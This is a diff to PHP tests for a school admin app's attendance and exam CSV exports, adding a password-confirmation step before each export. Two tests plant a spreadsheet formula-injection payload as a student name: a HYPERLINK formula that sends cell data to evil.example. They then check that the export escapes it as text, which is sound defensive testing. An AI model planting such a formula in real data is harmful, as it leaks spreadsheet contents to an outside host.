@@ -84,6 +84,7 @@ test('the date range filters records and swaps a reversed range', function () {
 test('the attendance report exports students as CSV', function () {
     seedMarch();
 
+    confirmPassword();
     $csv = $this->get('/admin/reports/attendance?division='.$this->division->id.'&format=csv')->streamedContent();
 
     expect($csv)->toContain('Student,Division,Present,Late,Absent,Excused,Days,Percent')
@@ -95,6 +96,7 @@ test('the attendance export writes a formula-like student name as text', functio
     $this->poor->update(['first_name' => '=HYPERLINK("https://evil.example/?"&A1,"Open")']);
     seedMarch();
 
+    confirmPassword();
     $csv = $this->get('/admin/reports/attendance?division='.$this->division->id.'&format=csv')->streamedContent();
 
     expect($csv)->toContain('"\'=HYPERLINK(')->not->toContain('"=HYPERLINK(');
@@ -117,6 +119,7 @@ test('the exam report shows pass rate, average and top student per division and 
         ->assertSee('Goodie')
         ->assertSee('Zoology');
 
+    confirmPassword();
     $csv = $this->get('/admin/reports/exams?exam='.$exam->id.'&format=csv')->streamedContent();
     expect($csv)->toContain('Division,Students,Complete,Passed')->toContain(',2,2,1,50,60,');
 });
@@ -127,6 +130,7 @@ test('the exam report export writes a formula-like top student name as text', fu
     $subject = Subjects::factory()->create();
     Mark::factory()->create(['exam_id' => $exam->id, 'student_id' => $this->good->id, 'subject_id' => $subject->id, 'division_id' => $this->division->id, 'marks' => 90]);
 
+    confirmPassword();
     $csv = $this->get('/admin/reports/exams?exam='.$exam->id.'&format=csv')->streamedContent();
 
     expect($csv)->toContain('"\'=HYPERLINK(')->not->toContain('"=HYPERLINK(');
